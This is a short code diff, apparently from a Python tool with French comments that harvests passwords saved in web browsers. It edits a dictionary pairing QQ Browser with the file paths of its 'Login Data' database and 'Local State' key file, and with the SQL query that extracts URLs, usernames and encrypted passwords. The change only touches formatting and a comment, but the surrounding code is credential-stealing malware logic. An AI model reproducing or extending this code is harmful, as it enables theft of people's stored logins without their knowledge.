@@ -61,8 +61,8 @@ browser_choice = {
     "11": ["QQ Browser (Tencent)",
            appdata + r"\..\Local\Tencent\QQBrowser\User Data\Default\Login Data",
            appdata + r"\..\Local\Tencent\QQBrowser\User Data\Local State",
-          "SELECT origin_url, username_value, password_value FROM logins"]
-}  # Dictionnaire des navigateurs supportés et des fichiers clés (Login Data & Pref Service)
+           "SELECT origin_url, username_value, password_value FROM logins"]
+}  # Dictionnaire des navigateurs supportés, des fichiers clés (Login Data & Pref Service) et de la requête SQL
 
 
 # Copie le fichier contenant les mots de passes (pour simultanéité)
